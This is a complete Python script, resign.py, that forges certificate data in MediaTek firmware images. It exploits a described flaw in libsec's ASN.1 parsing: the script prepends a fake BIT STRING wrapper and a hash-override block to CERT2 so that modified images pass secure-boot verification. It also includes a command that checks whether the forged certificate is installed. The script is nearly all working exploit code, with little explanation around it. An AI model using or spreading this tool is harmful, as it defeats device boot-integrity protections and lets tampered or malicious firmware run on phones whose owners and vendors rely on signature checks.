#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
resign.py - MTK image fake-cert install / verify tool (legacy, bypass_mode=1).

How it works:
    MTK libsec has a logic flaw when verifying CERT2: in bypass_mode=1 (old V5/V6
    libsec), the ASN.1 parser steps into every object it meets. So a fake BIT STRING
    placed at the front of the CERT2 DER is entered, and the real certificate SEQUENCE
    nested inside it is then walked as usual.
    This tool prepends two sibling blocks before the original CERT2 DER:
        1. BIT STRING(original CERT2 DER)   -- the legacy wrapper libsec steps into
        2. 0xA0 { OID 2.16.886.2454.2.4 + BIT STRING(new header hash)
                 OID 2.16.886.2454.2.1 + BIT STRING(new image  hash) }
    libsec finds the hash override first and trusts it, ignoring the real signed
    content, so a modified image still passes verification.

Usage:
    python3 resign.py -V | --version
    python3 resign.py install <img> [-o <output>]
    python3 resign.py verify  <img>
"""
import argparse
import hashlib
import struct
import sys
from pathlib import Path

VERSION = "1.4-dev"

PART_MAGIC = 0x58881688
PART_HDR_SIZE = 512
PART_HDR_FORMAT = "<II32sIIIIIIIIII"          # 12*I + 32s = 80 bytes (header is 512 total, rest reserved)
IMG_TYPE_GROUP_CERT = 0x02 << 24
IMG_TYPE_CERT2 = IMG_TYPE_GROUP_CERT | 0x02
OID_IMAGE_HASH = '2.16.886.2454.2.1'          # Image Hash
OID_IMAGE_HEADER_HASH = '2.16.886.2454.2.4'   # Image Header Hash


# ---------------- DER encode/decode (pure Python, adapted from parse_mtk_certs.py / sign_mtk_cert.py) ----

def read_tag(data, off):
    b0 = data[off]
    tag_class = (b0 & 0xC0) >> 6
    constructed = bool(b0 & 0x20)
    tagnum = b0 & 0x1F
    tag_bytes = bytes([b0])
    i = off + 1
    if tagnum == 0x1F:                         # long-form tag number
        tagnum = 0
        while True:
            if i >= len(data):
                raise ValueError('Truncated long-form tag')
            b = data[i]
            tag_bytes += bytes([b])
            tagnum = (tagnum << 7) | (b & 0x7F)
            i += 1
            if not (b & 0x80):
                break
    return tag_class, constructed, tagnum, tag_bytes, i - off


def read_length(data, off):
    if off >= len(data):
        raise ValueError('Truncated length')
    b = data[off]
    if not (b & 0x80):
        return b, 1                            # short form
    num = b & 0x7F
    if num == 0:
        return None, 1                         # indefinite length (BER), not expected in DER
    if off + 1 + num > len(data):
        raise ValueError('Truncated length bytes')
    val = 0
    for i in range(num):
        val = (val << 8) | data[off + 1 + i]
    return val, 1 + num


def decode_oid(oid_bytes):
    if not oid_bytes:
        return ''
    first = oid_bytes[0]
    parts = [str(first // 40), str(first % 40)]
    val = 0
    for b in oid_bytes[1:]:
        val = (val << 7) | (b & 0x7F)
        if not (b & 0x80):
            parts.append(str(val))
            val = 0
    return '.'.join(parts)


def encode_length(n):
    if n < 0x80:
        return bytes([n])
    s = n.to_bytes((n.bit_length() + 7) // 8, 'big')
    return bytes([0x80 | len(s)]) + s


def encode_oid(oid):
    parts = [int(x) for x in oid.split('.')]
    if len(parts) < 2:
        raise ValueError('bad oid')
    out = bytearray([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        if p == 0:
            out.append(0)
            continue
        chunks = []
        while p > 0:
            chunks.insert(0, p & 0x7F)
            p >>= 7
        for i, v in enumerate(chunks):
            out.append(0x80 | v if i != len(chunks) - 1 else v)
    return bytes(out)


def build_oid_tlv(oid):
    b = encode_oid(oid)
    return b'\x06' + encode_length(len(b)) + b


def build_bitstring_tlv(payload):
    val = b'\x00' + payload                    # 0 unused bits prefix
    return b'\x03' + encode_length(len(val)) + val


# ---------------- MKIMG part_hdr_t parsing ----

def roundup(value, align):
    if align is None or align <= 0:
        return value
    return ((value + align - 1) // align) * align


class PartHdr:
    def __init__(self, values):
        self.magic = values[0]
        self.dsize = values[1]
        self.name = values[2].split(b"\0", 1)[0].decode('latin-1')
        self.maddr = values[3]
        self.mode = values[4]
        self.ext_magic = values[5]
        self.hdr_sz = values[6]
        self.hdr_ver = values[7]
        self.img_type = values[8]
        self.img_list_end = values[9]
        self.align_sz = values[10]
        self.dsize_extend = values[11]
        self.maddr_extend = values[12]

    @classmethod
    def parse_from_bytes(cls, data, off):
        return cls(struct.unpack_from(PART_HDR_FORMAT, data, off))

    def padded_data_size(self):
        return roundup(self.dsize, self.align_sz)


def parse_part_headers(data):
    out = []
    off = 0
    file_size = len(data)
    idx = 0
    while off + PART_HDR_SIZE <= file_size:
        try:
            hdr = PartHdr.parse_from_bytes(data, off)
        except struct.error:
            break
        if hdr.magic != PART_MAGIC:
            break
        data_offset = off + PART_HDR_SIZE
        next_offset = off + PART_HDR_SIZE + hdr.padded_data_size()
        if data_offset + hdr.dsize > file_size:
            break
        out.append((idx, off, data_offset, next_offset, hdr))
        idx += 1
        off = next_offset
        if hdr.img_list_end:
            break
    return out


# ---------------- DER tree parsing / lookup ----

def parse_tlv_tree(data, base_off=0):
    nodes = []
    off = 0
    L = len(data)
    while off < L:
        try:
            tag_class, constructed, tagnum, tag_bytes, tag_len = read_tag(data, off)
            length, len_len = read_length(data, off + tag_len)
        except Exception:
            break
        hdr_len = tag_len + len_len
        val_off = off + hdr_len
        val_end = val_off + length
        if length is None or val_end > L:
            break
        val = data[val_off:val_end]
        node = {
            'off': base_off + off,
            'tag_class': tag_class,
            'constructed': constructed,
            'tagnum': tagnum,
            'hdr_len': hdr_len,
            'length': length,
            'val': None if constructed else val,
            'children': parse_tlv_tree(val, base_off + val_off) if constructed else None,
        }
        nodes.append(node)
        off = val_end
    return nodes


def _find_bitstring_in_node(node):
    if node is None:
        return None
    if node['tag_class'] == 0 and node['tagnum'] == 3 and node['val'] is not None:
        return node['val']
    if node.get('children'):
        for ch in node['children']:
            res = _find_bitstring_in_node(ch)
            if res is not None:
                return res
    return None


def find_oid_bitstring(der, oid_str):
    """Find the given OID anywhere in the DER nest; return the following BIT STRING
       (with unused-bits prefix) or None."""
    root_nodes = parse_tlv_tree(der, base_off=0)

    def walk(nodes):
        for i, node in enumerate(nodes):
            if node['tag_class'] == 0 and node['tagnum'] == 6 and node['val'] is not None:
                try:
                    name = decode_oid(node['val'])
                except Exception:
                    name = ''
                if name == oid_str:
                    for j in range(i + 1, len(nodes)):
                        bs = _find_bitstring_in_node(nodes[j])
                        if bs is not None:
                            return bs
                    return None
            if node.get('children'):
                res = walk(node['children'])
                if res is not None:
                    return res
        return None

    return walk(root_nodes)


def find_first_tlv(data):
    """Parse the first TLV at the start of data; return
       (tag_class, constructed, tagnum, val_off, val_end) or None."""
    if not data:
        return None
    try:
        tag_class, constructed, tagnum, tag_bytes, tag_len = read_tag(data, 0)
        length, len_len = read_length(data, tag_len)
    except Exception:
        return None
    if length is None:
        return None
    val_off = tag_len + len_len
    val_end = val_off + length
    if val_end > len(data):
        return None
    return tag_class, constructed, tagnum, val_off, val_end


def iter_top_level_tlvs(data):
    off = 0
    while off < len(data):
        first = find_first_tlv(data[off:])
        if not first:
            break
        tag_class, constructed, tagnum, val_off, val_end = first
        yield {
            'off': off,
            'end': off + val_end,
            'tag_class': tag_class,
            'constructed': constructed,
            'tagnum': tagnum,
            'val_off': off + val_off,
        }
        off += val_end


def find_original_cert2_der(der):
    """Locate the original CERT2 DER SEQUENCE (0x30) in the blob.
       Returns (der_bytes, rel_offset)."""
    for node in iter_top_level_tlvs(der):
        if node['tag_class'] == 0 and node['constructed'] and node['tagnum'] == 0x10:
            return der[node['off']:node['end']], node['off']
    raise ValueError('original CERT2 DER SEQUENCE (0x30) not found')


def recover_original_der(der):
    """Strip any legacy BIT STRING wrapper and 0xA0 override block prepended by a
       previous install, so re-installing is idempotent. Stops at the first 0x30
       SEQUENCE (the real CERT2 root)."""
    while True:
        first = find_first_tlv(der)
        if not first:
            break
        is_bitstring = (first[0] == 0 and first[2] == 3)        # universal BIT STRING
        is_override = (first[0] == 2 and first[1] and first[2] == 0)  # ctx cons tag 0 (0xA0)
        if is_bitstring or is_override:
            der = der[first[4]:]
        else:
            break
    return der


# ---------------- Hash override block construction / writeback ----

def build_hash_override_block(header_digest, image_digest):
    parts = []
    if header_digest is not None:
        parts.append(build_oid_tlv(OID_IMAGE_HEADER_HASH))
        parts.append(build_bitstring_tlv(header_digest))
    if image_digest is not None:
        parts.append(build_oid_tlv(OID_IMAGE_HASH))
        parts.append(build_bitstring_tlv(image_digest))
    if not parts:
        return b''
    inner = b''.join(parts)
    return b'\xa0' + encode_length(len(inner)) + inner


def replace_cert2_blob(data, c_blob_off, c_off, c_hdr, new_blob):
    new_dsz = len(new_blob)
    old_padded = c_hdr.padded_data_size()
    new_padded = roundup(new_dsz, c_hdr.align_sz)
    new_blob_padded = new_blob + b'\x00' * (new_padded - len(new_blob))
    out = bytearray(data)
    out[c_blob_off:c_blob_off + old_padded] = new_blob_padded
    struct.pack_into('<I', out, c_off + 4, new_dsz)   # update part_hdr.dsize
    return bytes(out)


# ---------------- Locate CERT2 / target image ----

def find_cert2_and_target(parts):
    cert2_entry = None
    for idx, off, data_off, next_off, hdr in parts:
        if hdr.img_type == IMG_TYPE_CERT2:
            cert2_entry = (idx, off, data_off, next_off, hdr)
            break
    if not cert2_entry:
        return None, None
    c_off = cert2_entry[1]
    target_part = None
    for idx, off, data_off, next_off, hdr in parts:
        if off < c_off and (hdr.img_type & 0xff000000) != IMG_TYPE_GROUP_CERT:
            target_part = (idx, off, data_off, next_off, hdr)   # last non-cert image before CERT2
    return cert2_entry, target_part


def compute_hash_inputs(data, target_part):
    _, t_off, t_data_off, _, t_hdr = target_part
    img_hdr_sz = t_hdr.hdr_sz if t_hdr.hdr_sz else PART_HDR_SIZE
    header_bytes = data[t_off:t_off + img_hdr_sz]
    padded_size = t_hdr.padded_data_size()
    data_bytes = data[t_data_off:t_data_off + padded_size]
    return header_bytes, data_bytes


def alg_from_len(n):
    return 'sha256' if n == 32 else ('sha384' if n == 48 else None)


# ---------------- Command implementations ----

def cmd_install(args):
    path = Path(args.image)
    if not path.exists():
        print(f'[ERROR] file not found: {path}')
        return 2
    data = path.read_bytes()
    print(f"Image: {path.name}  Size: {len(data)} bytes")

    parts = parse_part_headers(data)
    if not parts:
        print('[ERROR] no part_hdr_t headers found, exiting')
        return 1

    cert2_entry, target_part = find_cert2_and_target(parts)
    if not cert2_entry:
        print('[ERROR] CERT2 partition header not found, exiting')
        return 1
    if not target_part:
        print('[ERROR] no target image partition found before CERT2; cannot compute hashes')
        return 1

    _, c_off, c_blob_off, _, c_hdr = cert2_entry
    der = data[c_blob_off:c_blob_off + c_hdr.dsize]
    print(f'CERT2: off=0x{c_off:08x}  blob=0x{c_blob_off:08x}  dsize={c_hdr.dsize}')

    # Idempotent: strip any legacy wrapper / override block from a previous install
    recovered = recover_original_der(der)
    if len(recovered) != len(der):
        print(f'[INFO] existing legacy prefix detected and stripped ({len(der) - len(recovered)} bytes); will re-inject')

    # Original CERT2 DER SEQUENCE (0x30) that the legacy wrapper must enclose
    original_cert2_der, original_rel = find_original_cert2_der(recovered)
    print(f'Original CERT2 DER at rel=0x{original_rel:x}, size={len(original_cert2_der)}')

    # Identify hash algorithm from the original DER
    hdr_bit = find_oid_bitstring(recovered, OID_IMAGE_HEADER_HASH)
    img_bit = find_oid_bitstring(recovered, OID_IMAGE_HASH)
    if hdr_bit is None or img_bit is None or len(hdr_bit) < 1 or len(img_bit) < 1:
        print('[ERROR] Image Header Hash / Image Hash OID not found in CERT2')
        return 1
    old_hdr_digest = hdr_bit[1:]
    old_img_digest = img_bit[1:]
    alg = alg_from_len(len(old_hdr_digest)) or alg_from_len(len(old_img_digest))
    if alg is None:
        print(f'[ERROR] cannot identify hash algorithm (header len={len(old_hdr_digest)}, image len={len(old_img_digest)})')
        return 1
    hfn = hashlib.sha256 if alg == 'sha256' else hashlib.sha384

    header_bytes, data_bytes = compute_hash_inputs(data, target_part)
    new_hdr_digest = hfn(header_bytes).digest()
    new_img_digest = hfn(data_bytes).digest()
    print(f'Algorithm: {alg}')
    print(f'  old header hash: {old_hdr_digest.hex()}')
    print(f'  new header hash: {new_hdr_digest.hex()}')
    print(f'  old image  hash: {old_img_digest.hex()}')
    print(f'  new image  hash: {new_img_digest.hex()}')

    # Legacy prefix: BIT STRING(original DER) + 0xA0 hash override, placed before the original DER
    legacy_block = build_bitstring_tlv(original_cert2_der)
    insert_block = build_hash_override_block(new_hdr_digest, new_img_digest)
    print(f'Legacy BIT STRING wrapper: {len(legacy_block)} bytes')
    print(f'Override block 0xA0: {len(insert_block)} bytes')

    new_blob = legacy_block + insert_block + recovered
    out_bytes = replace_cert2_blob(data, c_blob_off, c_off, c_hdr, new_blob)
    new_padded = roundup(len(new_blob), c_hdr.align_sz)
    print(f'New CERT2 dsize={len(new_blob)}  padded={new_padded}  align={c_hdr.align_sz}')

    out = Path(args.out) if args.out else path.with_suffix(path.suffix + '.signed')
    out.write_bytes(out_bytes)
    print(f'[OK] written: {out}')
    return 0


def cmd_verify(args):
    path = Path(args.image)
    if not path.exists():
        print(f'[ERROR] file not found: {path}')
        return 2
    data = path.read_bytes()
    print(f"Image: {path.name}  Size: {len(data)} bytes")

    parts = parse_part_headers(data)
    if not parts:
        print('[ERROR] no part_hdr_t headers found')
        return 1
    cert2_entry, target_part = find_cert2_and_target(parts)
    if not cert2_entry:
        print('[ERROR] CERT2 partition header not found')
        return 1
    if not target_part:
        print('[ERROR] no target image partition found before CERT2')
        return 1

    _, c_off, c_blob_off, _, c_hdr = cert2_entry
    der = data[c_blob_off:c_blob_off + c_hdr.dsize]

    # Legacy layout: BIT STRING(wrapper) + 0xA0(override) + original DER
    first = find_first_tlv(der)
    if not first or not (first[0] == 0 and first[2] == 3):
        print(f'[FAIL] no legacy BIT STRING wrapper at start of CERT2 (off=0x{c_off:08x}) - fake cert not installed')
        return 1
    wrapper_size = first[4]

    after_bs = der[first[4]:]
    second = find_first_tlv(after_bs)
    if not second or not (second[0] == 2 and second[1] and second[2] == 0):
        print(f'[FAIL] legacy BIT STRING present ({wrapper_size} bytes) but no 0xA0 override block after it')
        return 1
    block_size = second[4]

    override_content = after_bs[second[3]:second[4]]
    inj_hdr_bit = find_oid_bitstring(override_content, OID_IMAGE_HEADER_HASH)
    inj_img_bit = find_oid_bitstring(override_content, OID_IMAGE_HASH)
    if inj_hdr_bit is None or inj_img_bit is None or len(inj_hdr_bit) < 1 or len(inj_img_bit) < 1:
        print(f'[FAIL] 0xA0 override block present ({block_size} bytes) but missing header/image hash OID')
        return 1

    inj_hdr = inj_hdr_bit[1:]
    inj_img = inj_img_bit[1:]
    alg = alg_from_len(len(inj_hdr))
    if alg is None:
        print(f'[FAIL] cannot identify injected hash algorithm (length {len(inj_hdr)})')
        return 1
    hfn = hashlib.sha256 if alg == 'sha256' else hashlib.sha384

    header_bytes, data_bytes = compute_hash_inputs(data, target_part)
    cur_hdr = hfn(header_bytes).digest()
    cur_img = hfn(data_bytes).digest()

    print(f'CERT2 off=0x{c_off:08x}  legacy layout detected')
    print(f'  BIT STRING wrapper: {wrapper_size} bytes')
    print(f'  0xA0 override block: {block_size} bytes')
    print(f'Algorithm: {alg}')
    print(f'  injected header hash: {inj_hdr.hex()}')
    print(f'  current  header hash: {cur_hdr.hex()}')
    print(f'  injected image  hash: {inj_img.hex()}')
    print(f'  current  image  hash: {cur_img.hex()}')

    hdr_ok = inj_hdr == cur_hdr
    img_ok = inj_img == cur_img
    if hdr_ok and img_ok:
        print('[OK] fake cert installed and hashes match current image content (valid)')
        return 0
    print('[WARN] fake cert installed but hashes do not match current image content (content changed, re-install needed)')
    if not hdr_ok:
        print('  - header hash mismatch')
    if not img_ok:
        print('  - image hash mismatch')
    return 1


def main():
    p = argparse.ArgumentParser(
        prog='resign.py',
        description='MTK image fake-cert install / verify tool (legacy, bypass_mode=1)',
    )
    p.add_argument('-V', '--version', action='store_true', help='show version')
    sub = p.add_subparsers(dest='cmd')

    pi = sub.add_parser('install', help='install fake cert into image (legacy mode)')
    pi.add_argument('image', help='input image file')
    pi.add_argument('-o', '--out', help='output file (default <input>.signed)')
    pi.set_defaults(func=cmd_install)

    pv = sub.add_parser('verify', help='verify fake cert is successfully installed')
    pv.add_argument('image', help='input image file')
    pv.set_defaults(func=cmd_verify)

    args = p.parse_args()
    if args.version:
        print(f'resign.py {VERSION}')
        return 0
    if not getattr(args, 'func', None):
        p.print_help()
        return 2
    return args.func(args)


if __name__ == '__main__':
    sys.exit(main())
